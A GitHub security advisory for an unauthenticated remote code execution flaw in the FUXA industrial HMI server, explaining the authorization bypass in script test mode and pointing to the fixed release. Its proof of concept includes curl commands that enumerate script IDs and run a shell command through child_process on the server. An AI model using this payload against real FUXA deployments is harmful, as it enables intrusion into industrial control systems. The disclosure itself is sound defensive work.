# [H] FUXA Vulnerable to Unauthenticated Remote Code Execution via Script Test Mode Authorization Bypass

## Summary
Severity: High
Advisory: GHSA-rg3m-cfq7-g6h6
CVE: CVE-2026-43947
CWE: CWE-863
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-05-26
Source: https://github.com/advisories/GHSA-rg3m-cfq7-g6h6
Type: github-advisory

## Affected
- npm: `fuxa-server` — affected >=1.3.0 <1.3.1

## Details
### Summary

An unauthenticated Remote Code Execution vulnerability exists in FUXA when `secureEnabled` is set to `true`. The `POST /api/runscript` endpoint checks authorization against the stored script's permission by ID, but when `test: true` is set in the request, it compiles and executes attacker-supplied code instead of the stored script's code. An unauthenticated attacker who knows a valid script ID and name may execute arbitrary code via test mode if at least one server-side script exists and is accessible without restrictive permissions.

Script IDs and names can be obtained through the unauthenticated information disclosure in `GET /api/project` (reported separately).

The only prerequisite is that at least one server-side script exists in the project.

### Details

**Authorization confused deputy in script execution**

File: `server/runtime/scripts/index.js`, lines 86-103

The authorization check looks up the stored script by ID and validates the stored script's `permission` field:

```javascript
this.isAuthorised = function (_script, permission) {
    const st = scriptModule.getScript(_script);  // finds stored script by _script.id
    if (admin || (st && (!st.permission || st.permission & permission))) {
        return true;
    }
    return false;
}
```

When a script has no `permission` field set (or `permission: 0`), the expression `!st.permission` evaluates to `true`, and the check passes for any caller including guests.

**Guest auto-authentication in the middleware**

File: `server/api/jwt-helper.js`, lines 46-72

The `verifyToken` middleware generates a valid guest JWT when no token is provided:

```javascript
if (!token) {
    token = getGuestToken();
}
```

The guest token passes verification. The request proceeds to the handler with `userId: "guest"`. The `isAuthorised` check then finds the stored script and validates against its permission. Scripts without a `permission` field pass for any user including guests.

**Test mode executes attacker-supplied code**

File: `server/runtime/scripts/msm.js`

When `test: true` is set, `runTestScript` takes the attacker's `code` field from the request body, compiles it into a Node.js module via `Module._compile`, and executes it with full access to `require`, `child_process`, `fs`, and the entire Node.js runtime. The authorization checked the stored script's permission. The execution runs the attacker's code.

### PoC

Requires an existing server-side script accessible without restrictive permissions.

**Step 1: Retrieve script IDs from the unauthenticated project endpoint**

```bash
curl -s http://192.168.32.129:1881/api/project | jq '.scripts[] | {id, name, permission}'
```

```json
{
  "id": "legit-001",
  "name": "calculate",
}
{
  "id": "s_42a888fa-8e3d4213",
  "name": "subs",
}
```

**Step 2: Execute `whoami` without authentication**

Using the script ID and name from step 1:

```bash
curl -s -X POST http://192.168.32.129:1881/api/runscript \
  -H "Content-Type: application/json" \
  -d '{"params":{"script":{"id":"s_42a888fa-8e3d4213","name":"subs","test":true,"code":"return require(\"child_process\").execSync(\"whoami\").toString()","parameters":[],"sync":true}}}'
```


### Impact

Any network-reachable attacker can achieve Remote Code Execution on the FUXA server without any credentials. The attacker needs a valid script ID and name (obtainable through the separately reported information disclosure) and one server-side script to exist in the project.

Potential impact includes arbitrary command execution on the host, access to configured device connections and credentials, and compromise of industrial control functionality managed by the FUXA instance.

This issue depends on the presence of an existing server-side script with no restrictive permissions configured. It does not affect configurations without server-side scripts or where script permissions prevent guest access.

## References
- https://github.com/frangoteam/FUXA/security/advisories/GHSA-rg3m-cfq7-g6h6
- https://github.com/frangoteam/FUXA/pull/2260
- https://github.com/frangoteam/FUXA/commit/78534da61a91613712b44bb63c8d7da8c5df5ca4
- https://github.com/frangoteam/FUXA
- https://github.com/frangoteam/FUXA/releases/tag/v1.3.1
